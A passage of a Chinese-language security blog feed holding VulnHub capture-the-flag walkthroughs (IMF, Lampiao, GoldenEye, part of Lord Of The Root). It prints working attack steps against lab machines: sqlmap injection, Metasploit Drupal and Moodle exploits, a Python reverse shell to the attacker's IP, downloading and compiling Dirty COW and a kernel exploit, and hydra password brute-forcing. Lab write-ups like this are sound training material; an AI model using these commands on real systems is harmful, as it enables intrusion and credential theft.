class="token function">ip</span> <span class="token number">19023</span> <span class="token operator">&gt;</span>/tmp/f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="4-提权"><a href="#4-提权" class="headerlink" title="4. 提权"></a>4. 提权</h2><p>使用获取到的密码切换 root 用户</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">su</span> root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020221017173756.png"></p><p>转 tty</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 <span class="token parameter variable">-c</span> <span class="token string">'import pty; pty.spawn("/bin/bash")'</span><span class="token function">id</span><span class="token function">ls</span> ~/<span class="token function">cat</span> ~/rOOt.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020221017174038.png"></p><p>获得第二个 flag</p><h2 id="5-FLAG"><a href="#5-FLAG" class="headerlink" title="5. FLAG"></a>5. FLAG</h2><p>FLAG1：3mp!r3{You_Manage_To_Break_To_My_Secure_Access}</p><p>FLAG2：3mp!r3{You_Manage_To_BreakOut_From_My_System_Congratulation}</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VulnHub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulnHub - IMF</title>
      <link href="/2023/01/28/penetrationstest/ba-chang-xue-xi/vulnhub/vulnhub-imf/"/>
      <url>/2023/01/28/penetrationstest/ba-chang-xue-xi/vulnhub/vulnhub-imf/</url>
      
        <content type="html"><![CDATA[<h1 id="VulnHub-IMF"><a href="#VulnHub-IMF" class="headerlink" title="VulnHub - IMF"></a>VulnHub - IMF</h1><h2 id="1-前言-amp-搭建"><a href="#1-前言-amp-搭建" class="headerlink" title="1. 前言&amp;搭建"></a>1. 前言&amp;搭建</h2><p>VulnhHub靶场链接：<a href="https://www.vulnhub.com/entry/imf-1,162/">https://www.vulnhub.com/entry/imf-1,162/</a></p><blockquote><p>Welcome to “IMF”, my first Boot2Root virtual machine. IMF is a intelligence agency that you must hack to get all flags and ultimately root. The flags start off easy and get harder as you progress. Each flag contains a hint to the next flag. I hope you enjoy this VM and learn something.</p></blockquote><p>网络拓扑</p><table><thead><tr><th>作用</th><th>系统</th><th>IP</th></tr></thead><tbody><tr><td>攻击机</td><td>Kali</td><td>192.168.0.102</td></tr><tr><td>靶机</td><td>Ubuntu</td><td>192.168.0.101</td></tr></tbody></table><h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2. 信息收集"></a>2. 信息收集</h2><h3 id="2-1-获取目标-IP-地址"><a href="#2-1-获取目标-IP-地址" class="headerlink" title="2.1 获取目标 IP 地址"></a>2.1 获取目标 IP 地址</h3><p>使用 nmap 进行探测</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sS</span> <span class="token number">192.168</span>.80.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-2-端口服务探测"><a href="#2-2-端口服务探测" class="headerlink" title="2.2 端口服务探测"></a>2.2 端口服务探测</h3><p>![[../../../../pic/Pasted image 20220828143220.png|L]]</p><p>确定存在服务</p><table><thead><tr><th>端口</th><th>服务</th><th>功能</th><th>可能性</th></tr></thead><tbody><tr><td>80</td><td>http</td><td>提供web服务功能</td><td>渗透测试</td></tr></tbody></table><h2 id="3-网页渗透"><a href="#3-网页渗透" class="headerlink" title="3. 网页渗透"></a>3. 网页渗透</h2><p>访问 80 端口</p><p>![[../../../../pic/Pasted image 20220828143247.png|L]]</p><p>检查页面源码，在 contact.php 获取到第一个 flag</p><p>![[../../../../pic/Pasted image 20220828143327.png|L]]</p><p>解码后获取到提示信息 all the files</p><p>![[../../../../pic/Pasted image 20220828143446.png|L]]</p><p>在源代码中发现几个 base64 编码后的文件名，组合后解码获得 flag</p><p>![[../../../../pic/Pasted image 20220828143611.png|L]]</p><p>![[../../../../pic/Pasted image 20220828143726.png|L]]</p><p>再次解码获得提示</p><p>![[../../../../pic/Pasted image 20220828143745.png|L]]</p><p>访问 imfadministrator 进入到一个登录界面</p><p>![[../../../../pic/Pasted image 20220828143949.png|L]]</p><p>源码中提示</p><p>![[../../../../pic/Pasted image 20220828144016.png|L]]</p><p>推测密码直接存在 php 文件中，在登录时使用 strcmp 进行比较密码，当使用 srtcmp 将一个数组和一个字符串进行比较时会发生报错从而跳出比较</p><p>但是无论输入什么都会提示无效用户名，先找一个有效的用户名</p><p>![[../../../../pic/Pasted image 20220828144305.png|L]]</p><p>存在三个联系人，使用 rmichaels 成功登录</p><p>![[../../../../pic/Pasted image 20220828144329.png|L]]</p><p>获取到下一步提示，continue to cms</p><p>![[../../../../pic/Pasted image 20220828144429.png|L]]</p><p>点击链接进入下一关</p><p>在 URL 中存在 SQL 注入，sqlmap 一把梭</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap <span class="token parameter variable">-u</span> <span class="token string">"http://192.168.80.138/imfadministrator/cms.php?pagename=1*"</span> <span class="token parameter variable">--cookie</span> <span class="token string">"PHPSESSID=f8oaojl7fnrt23ap618m558al6"</span> --random-agent <span class="token parameter variable">--dbs</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![[../../../../pic/Pasted image 20220828145126.png|L]]</p><p>还存在一个 tutorials-incomplete 页面，访问后获得一个图片</p><p>![[../../../../pic/Pasted image 20220828145203.png|L]]</p><p>扫描二维码获得第四个 flag flag4{dXBsb2Fkcjk0Mi5waHA=}，解码获得提示 uploadr942.php</p><p>文件上传，经过测试只能上传 jpg，png，以及 gif 图片类型，要想命令执行只有在配置了 .htaccess 的情况下才能获得 shell，后的配置了解析 .gif 为 php</p><p>上传一个 gif 文件</p><p>![[../../../../pic/Pasted image 20220828151120.png|L]]</p><p>访问 <a href="http://192.168.80.138/imfadministrator/uploads/a3f5dbb3a874.gif">http://192.168.80.138/imfadministrator/uploads/a3f5dbb3a874.gif</a> 获得 shell</p><p>![[../../../../pic/Pasted image 20220828151345.png|L]]</p><p>在目录下获得 flag5 </p><p>![[../../../../pic/Pasted image 20220828152157.png|L]]</p><p>解码获得提示 agent services，似乎是代理服务，找一下该服务位置</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">whereis</span> agent<span class="token function">find</span> / <span class="token parameter variable">-name</span> agent <span class="token file-descriptor important">&amp;1</span><span class="token operator">&gt;</span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>![[../../../../pic/Pasted image 20220828154417.png|L]]</p><p>读取 /etc/xinetd.d/agent </p><p>![[../../../../pic/Pasted image 20220828154534.png|L]]</p><p>agent 服务开放在 7788 端口</p><p>在 /usr/local/bin/ 下发现 access_codes，涉及到敲击码，使用nmap</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -p7482,8279,9467 <span class="token number">192.168</span>.80.138nmap <span class="token parameter variable">-sS</span> <span class="token parameter variable">-sV</span> <span class="token parameter variable">-A</span> -p- <span class="token parameter variable">-T4</span> <span class="token number">192.168</span>.80.138<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>![[../../../../pic/Pasted image 20220828155613.png|L]]</p><p>扫出来了一个 7788</p><p>最后一个 flag 涉及到 缓冲区溢出，跳过</p><h2 id="5-小结"><a href="#5-小结" class="headerlink" title="5. 小结"></a>5. 小结</h2><ul><li>源码</li><li>PHP 数组绕过</li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VulnHub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulnHub - Lampiao</title>
      <link href="/2023/01/28/penetrationstest/ba-chang-xue-xi/vulnhub/vulnhub-lampiao/"/>
      <url>/2023/01/28/penetrationstest/ba-chang-xue-xi/vulnhub/vulnhub-lampiao/</url>
      
        <content type="html"><![CDATA[<h1 id="VulnHub-Lampiao"><a href="#VulnHub-Lampiao" class="headerlink" title="VulnHub - Lampiao"></a>VulnHub - Lampiao</h1><h2 id="1-前言-amp-搭建"><a href="#1-前言-amp-搭建" class="headerlink" title="1. 前言&amp;搭建"></a>1. 前言&amp;搭建</h2><p>vulnhub靶场链接：<a href="http://www.vulnhub.com/entry/lampiao-1%2C249/">http://www.vulnhub.com/entry/lampiao-1%2C249/</a></p><p>搭建的拓扑结构图</p><table><thead><tr><th>作用</th><th>系统</th><th>IP</th></tr></thead><tbody><tr><td>攻击机</td><td>Kali</td><td>192.168.80.133</td></tr><tr><td>靶机</td><td>Ubuntu</td><td>192.168.80.132</td></tr></tbody></table><h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2. 信息收集"></a>2. 信息收集</h2><h3 id="2-1-扫描网段获取目标-IP-地址"><a href="#2-1-扫描网段获取目标-IP-地址" class="headerlink" title="2.1 扫描网段获取目标 IP 地址"></a>2.1 扫描网段获取目标 IP 地址</h3><p>使用 nmap 进项探测</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.80.0/24<span class="token comment"># -sP 指定使用 Ping 进行探测</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>![[../../../../pic/Pasted image 20220724195845.png|L]]</p><p>获取到 192.168.10.129 为靶机的 IP 地址</p><h3 id="2-2-扫描靶机端口"><a href="#2-2-扫描靶机端口" class="headerlink" title="2.2 扫描靶机端口"></a>2.2 扫描靶机端口</h3><p>使用 nmap 进行扫描</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> nmap <span class="token parameter variable">-sS</span> <span class="token parameter variable">-A</span> -p- <span class="token parameter variable">-T4</span> <span class="token number">192.168</span>.80.132<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![[../../../../pic/Pasted image 20220724200233.png|L]]</p><p>确认开启服务：</p><ul><li>22 端口开放，提供 ssh 远程登录服务</li><li>80 端口开放，提供 http 服务</li><li>1898 端口开放，提供 http 服务，使用 Apache 进行搭建</li></ul><h2 id="3-网页渗透"><a href="#3-网页渗透" class="headerlink" title="3. 网页渗透"></a>3. 网页渗透</h2><p>访问 80 端口为一个静态页面，似乎没有利用点</p><p>访问 1898 端口获取的一个使用 Drupal CMS 搭建的页面</p><p>Drupal CMS 的版本号可由 CHANGELOG.txt 文件获取，访问获取到当前使用的版本为 7.54，找一下是否存在相关漏洞</p><p><a href="https://www.exploit-db.com/exploits/44449">https://www.exploit-db.com/exploits/44449</a></p><p>存在 CVE-2018-7600 可以进行远程命令执行，上 msfconsole 搜索相关模块</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfconsolesearch CVE:CVE-2018-7600<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>![[../../../../pic/Pasted image 20220724202317.png|L]]</p><p>存在利用模块</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">set</span> RHOSTS  <span class="token number">192.168</span>.80.132<span class="token builtin class-name">set</span> rport <span class="token number">1898</span>run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>![[../../../../pic/Pasted image 20220724202458.png|L]]</p><p>成功获得会话</p><p>使用 python 转换为 tty</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python <span class="token parameter variable">-c</span> <span class="token string">'import pty; pty.spawn("/bin/bash")'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![[../../../../pic/Pasted image 20220724203104.png|L]]</p><p>查看系统版本，尝试提权</p><p>![[../../../../pic/Pasted image 20220724203133.png|L]]</p><p>使用脏牛进行提权</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">searchsploit dirty<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><a href="https://www.exploit-db.com/exploits/40847">https://www.exploit-db.com/exploits/40847</a></p><p>![[../../../../pic/Pasted image 20220724204445.png|L]]</p><p>提取出来，靶机上存在 g++</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Kali 上执行</span><span class="token function">cp</span> /usr/share/exploitdb/exploits/linux/local/40847.cpp ~/ python3 <span class="token parameter variable">-m</span> http.server <span class="token number">80</span><span class="token comment"># 靶机上执行</span><span class="token function">wget</span> http://192.168.80.133/40847.cpp g++ <span class="token parameter variable">-Wall</span> <span class="token parameter variable">-pedantic</span> <span class="token parameter variable">-O2</span> <span class="token parameter variable">-std</span><span class="token operator">=</span>c++11 <span class="token parameter variable">-pthread</span> <span class="token parameter variable">-o</span> dcow <span class="token number">40847</span>.cpp <span class="token parameter variable">-lutil</span>./dcow <span class="token parameter variable">-s</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>![[../../../../pic/Pasted image 20220724205001.png|L]]</p><p>成功提到 root 权限，读取 flag</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span> ~<span class="token function">cat</span> /root/flag.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VulnHub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulnHub - GoldenEye</title>
      <link href="/2023/01/28/penetrationstest/ba-chang-xue-xi/vulnhub/vulnhub-goldeneye/"/>
      <url>/2023/01/28/penetrationstest/ba-chang-xue-xi/vulnhub/vulnhub-goldeneye/</url>
      
        <content type="html"><![CDATA[<h1 id="VulnHub-GoldenEye"><a href="#VulnHub-GoldenEye" class="headerlink" title="VulnHub - GoldenEye"></a>VulnHub - GoldenEye</h1><h2 id="1-前言-amp-搭建"><a href="#1-前言-amp-搭建" class="headerlink" title="1. 前言&amp;搭建"></a>1. 前言&amp;搭建</h2><p>vulnhub靶场链接：<a href="https://www.vulnhub.com/entry/goldeneye-1,240/">https://www.vulnhub.com/entry/goldeneye-1,240/</a></p><p>搭建的拓扑结构图</p><p><img src="/../../../../pic/Pasted%20image%2020220722190133.png"></p><h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2. 信息收集"></a>2. 信息收集</h2><h3 id="2-1-扫描网段获取目标-IP-地址"><a href="#2-1-扫描网段获取目标-IP-地址" class="headerlink" title="2.1 扫描网段获取目标 IP 地址"></a>2.1 扫描网段获取目标 IP 地址</h3><p>使用 nmap 进项探测</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.10.0/24<span class="token comment"># -sP 指定使用 Ping 进行探测</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020220722191842.png"></p><p>获取到 192.168.10.129 为靶机的 IP 地址</p><h3 id="2-2-扫描靶机端口"><a href="#2-2-扫描靶机端口" class="headerlink" title="2.2 扫描靶机端口"></a>2.2 扫描靶机端口</h3><p>使用 nmap 进行扫描</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> nmap <span class="token parameter variable">-sS</span> <span class="token parameter variable">-T4</span> -p- <span class="token parameter variable">-A</span> <span class="token number">192.168</span>.10.129<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020220723194722.png"></p><p>使用 Goby 进行端口扫描</p><p><img src="/../../../../pic/Pasted%20image%2020220723194813.png"></p><p>已知目标端口开放了一下服务</p><ul><li>25 端口开放，提供 smtp 邮件服务，主要用于提供邮件发送服务</li><li>80 端口开放，提供 http 服务，使用 Apache 搭建，提供 Web 服务</li><li>55006 端口开放，提供 ssl/pop3 服务，用于 pop3 加密</li><li>55007 端口开放，提供 pop3 服务，用于接收邮件，管理邮件</li></ul><h2 id="3-网页渗透"><a href="#3-网页渗透" class="headerlink" title="3. 网页渗透"></a>3. 网页渗透</h2><p>访问 80端口</p><p><img src="/../../../../pic/Pasted%20image%2020220723195312.png"></p><p>获取到存在 /sev-home/ 目录，访问需要进行身份认证，收集一下是否存在用户信息泄露</p><p>进行目录扫描未发现信息泄露，查看网页源代码存在 js 文件</p><p>查看获得注释</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//</span><span class="token comment">//Boris, make sure you update your default password. </span><span class="token comment">//My sources say MI6 maybe planning to infiltrate. </span><span class="token comment">//Be on the lookout for any suspicious network traffic....</span><span class="token comment">//</span><span class="token comment">//I encoded you p@ssword below...</span><span class="token comment">//</span><span class="token comment">//&amp;#73;&amp;#110;&amp;#118;&amp;#105;&amp;#110;&amp;#99;&amp;#105;&amp;#98;&amp;#108;&amp;#101;&amp;#72;&amp;#97;&amp;#99;&amp;#107;&amp;#51;&amp;#114;</span><span class="token comment">//</span><span class="token comment">//BTW Natalya says she can break your codes</span><span class="token comment">//</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获取到两个用户 Boris 和 Natalya 以及 Boris 的密码经过HTML编码后的结果</p><p>解码后获取明文密码</p><p><img src="/../../../../pic/Pasted%20image%2020220723195900.png"></p><p>使用 boris / InvincibleHack3r 进行登录</p><p>新页面中提示存在 POP3 服务，在源码中发现泄露出来的两个用户</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">Qualified GoldenEye Network Operator Supervisors: NatalyaBoris<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>和之前搜集到的用户一致，使用这两个用户进行爆破 POP3 密码</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"natalya<span class="token entity" title="\n">\n</span>boris"</span> <span class="token operator">&gt;</span> user.txthydra <span class="token parameter variable">-L</span> user.txt <span class="token parameter variable">-P</span> /usr/share/wordlists/fasttrack.txt <span class="token parameter variable">-e</span> nsr <span class="token parameter variable">-s</span> <span class="token number">55007</span> <span class="token number">192.168</span>.10.129 pop3 <span class="token parameter variable">-o</span> account.txt<span class="token function">cat</span> account.txt <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获取到用户名以及密码</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">[55007][pop3] host: 192.168.10.129   login: natalya   password: bird[55007][pop3] host: 192.168.10.129   login: boris   password: secret1!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020220723202815.png"></p><p>使用 nc 或者 telnet 进行登录</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> <span class="token number">192.168</span>.10.129 <span class="token number">55007</span> <span class="token environment constant">USER</span> borisPASS secret1<span class="token operator">!</span>LIST<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020220724131217.png"></p><p>存在三封邮件，使用 RETR 进行读取</p><p>在 natalya 用户的第二封邮件中发现另一个信息</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">username: xeniapassword: RCP90rulez!Boris verified her as a valid contractor so just create the account ok?And if you didn't have the URL on outr internal Domain: severnaya-station.com/gnocertdir**Make sure to edit your host file since you usually work remote off-network....Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020220724131650.png"></p><p>将 ip 对应域名写入到 host 中，</p><p>Windows 在 C:/Windows/System32/drivers/etc/hosts  </p><p>Linux 在 /etc/hosts</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">192.168.10.129  severnaya-station.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后访问 <a href="http://severnaya-station.com/gnocertdir/">http://severnaya-station.com/gnocertdir/</a> 进入到后台，使用提供的账户进行登录</p><p>在消息列表中发现一个新用户 Doak，尝试爆破 doak 的 POP3 账户</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra <span class="token parameter variable">-l</span> doak <span class="token parameter variable">-P</span> /usr/share/wordlists/fasttrack.txt <span class="token parameter variable">-e</span> nsr <span class="token parameter variable">-s</span> <span class="token number">55007</span> <span class="token number">192.168</span>.10.129 pop3 <span class="token parameter variable">-o</span> account.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020220724134011.png"></p><p>获得新的账户</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">[55007][pop3] host: 192.168.10.129   login: doak   password: goat<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>登入 POP3 查看邮件</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">James,If you're reading this, congrats you've gotten this far. You know how tradecraft works right?Because I don't. Go to our training site and login to my account....dig until you can exfiltrate further information......username: dr_doakpassword: 4England!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获得了另一个账户，登入查看消息，在文件列表中存在 s3cret.txt 文件，下载后提供了一个图片地址 /dir007key/for-007.jpg</p><p>涉及到图片隐写，保存后进行图片分析</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> http://severnaya-station.com/dir007key/for-007.jpgexiftool for-007.jpg <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>分析后获得一串密文 eFdpbnRlcjE5OTV4IQ== Base64解密后获得明文 xWinter1995x!，该密码为 admin 的密码，作为管理员成功登入后台，使用 msf 中的脚本进行后台 RCE</p><p>需要修改页面的脚本文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token string">"Settings"</span>--<span class="token operator">&gt;</span><span class="token string">"Site administration"</span>--<span class="token operator">&gt;</span><span class="token string">"Plugins"</span>--<span class="token operator">&gt;</span><span class="token string">"Text editors"</span>--<span class="token operator">&gt;</span><span class="token string">"TinyMCE HTML editor"</span> 修改PSpellShell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020220724135035.png"></p><p>使用 msfconsole 进行 rce</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfconsolesearch Moodleuse exploit/multi/http/moodle_spelling_binary_rce<span class="token builtin class-name">set</span> Payload cmd/unix/reverse<span class="token builtin class-name">set</span> PASSWORD xWinter1995x<span class="token operator">!</span><span class="token builtin class-name">set</span> RHOSTS severnaya-station.com<span class="token builtin class-name">set</span> TARGETURI /gnocertdir/<span class="token builtin class-name">set</span> lhost <span class="token number">192.168</span>.10.130run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020220724135827.png"></p><p>获得会话，转 tty</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python <span class="token parameter variable">-c</span> <span class="token string">'import pty; pty.spawn("/bin/bash")'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>反弹 shell</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python <span class="token parameter variable">-c</span> <span class="token string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.10.130",10010));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>成功获得 shell</p><p><img src="/../../../../pic/Pasted%20image%2020220724140342.png"></p><p>但是权限有点低，尝试内核提取，查看一下系统</p><p><img src="/../../../../pic/Pasted%20image%2020220724140426.png"></p><p>为 Linux ubuntu 3.13.0</p><p>搜索到 exploit <a href="https://www.exploit-db.com/search?q=Linux+Kernel+3.13.0">https://www.exploit-db.com/search?q=Linux+Kernel+3.13.0</a></p><p>获得 exploit 号为  37292，在 Linux 上搜索</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">searchsploit linux kernel <span class="token number">3.13</span>.0 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020220724141059.png"></p><p>获得 exp 位置</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> /usr/share/exploitdb/exploits/linux/local/37292.c ~<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>由于靶机上只安装了 cc，修改一下 exp 文件中的 gcc 为 cc</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 <span class="token parameter variable">-m</span> http.server <span class="token number">80</span><span class="token comment"># 靶机上执行</span><span class="token function">wget</span> http://192.168.10.130/37292.c cc <span class="token number">37292</span>.c <span class="token parameter variable">-o</span> exp./exp<span class="token function">cat</span> /root/.flag.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020220724141756.png"></p><p>访问 <a href="http://severnaya-station.com/006-final/xvf7-flag/">http://severnaya-station.com/006-final/xvf7-flag/</a> 获取结局</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">FLAG CAPTUREDCongrats! *******************************You've captured the codes! And stopped Alec Trevelyan from his indestructible vengeance!!!!****************************************<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4-小结"><a href="#4-小结" class="headerlink" title="4. 小结"></a>4. 小结</h2><ul><li>信息收集</li><li>对 POP3 爆破</li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VulnHub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulnHub - Lord Of The Root</title>
      <link href="/2023/01/28/penetrationstest/ba-chang-xue-xi/vulnhub/vulnhub-lord-of-the-root/"/>
      <url>/2023/01/28/penetrationstest/ba-chang-xue-xi/vulnhub/vulnhub-lord-of-the-root/</url>
      
        <content type="html"><![CDATA[<h1 id="VulnHub-Lord-Of-The-Root"><a href="#VulnHub-Lord-Of-The-Root" class="headerlink" title="VulnHub - Lord Of The Root"></a>VulnHub - Lord Of The Root</h1><h2 id="1-前言-amp-搭建"><a href="#1-前言-amp-搭建" class="headerlink" title="1. 前言&amp;搭建"></a>1. 前言&amp;搭建</h2><p>VulnhHub靶场链接：<a href="https://www.vulnhub.com/entry/lord-of-the-root-101,129/">https://www.vulnhub.com/entry/lord-of-the-root-101,129/</a></p><p>网络拓扑</p><table><thead><tr><th>作用</th><th>系统</th><th>IP</th></tr></thead><tbody><tr><td>攻击机</td><td>Kali</td><td>172.29.59.89</td></tr><tr><td>靶机</td><td>Ubuntu</td><td>192.168.80.132</td></tr></tbody></table><h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2. 信息收集"></a>2. 信息收集</h2><h3 id="2-1-获取目标-IP-地址"><a href="#2-1-获取目标-IP-地址" class="headerlink" title="2.1 获取目标 IP 地址"></a>2.1 获取目标 IP 地址</h3><p>使用 nmap 进行探测</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sS</span> <span class="token number">192.168</span>.80.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-2-端口服务探测"><a href="#2-2-端口服务探测" class="headerlink" title="2.2 端口服务探测"></a>2.2 端口服务探测</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-Pn</span> <span class="token parameter variable">-sV</span> <span class="token parameter variable">-A</span> -p- <span class="token parameter variable">-T4</span> <span class="token number">192.168</span>.80.132<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![[../../../../pic/Pasted image 20220805235545.png|L]]</p><p>确定存在服务</p><table><thead><tr><th>端口</th><th>服务</th><th>功能</th><th>可能性</th></tr></thead><tbody><tr><td>22</td><td>SSH</td><td>提供远程登录服务</td><td>密码</td></tr></tbody></table><h2 id="3-端口渗透"><a href="#3-端口渗透" class="headerlink" title="3. 端口渗透"></a>3. 端口渗透</h2><h3 id="3-1-SSH-22-端口"><a href="#3-1-SSH-22-端口" class="headerlink" title="3.1 SSH - 22  端口"></a>3.1 SSH - 22  端口</h3><p>SSH连接上去</p><p>![[../../../../pic/Pasted image 20220805235917.png|L]]</p><p>获得提示</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">Lotr Knock Friend To Enter<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>进行端口碰撞——从外部按照一个正确的顺序连接防火墙预先设定的端口(这儿是123)，就可以实时改变防火墙策略、开放端口。 简单来说就是如果我们按照正确的顺序连接其端口后，它就会开放隐藏的端口</p><blockquote><p>#端口碰撞 技术是一种允许服务设备在用户按照约定的序列碰撞后，打开一个约定的服务端口提供服务的技术。所谓碰撞是由一个尝试访问系统中关闭端口的序列组成，也就是特定端口的连接请求。</p></blockquote><p>使用 <strong>knock</strong> 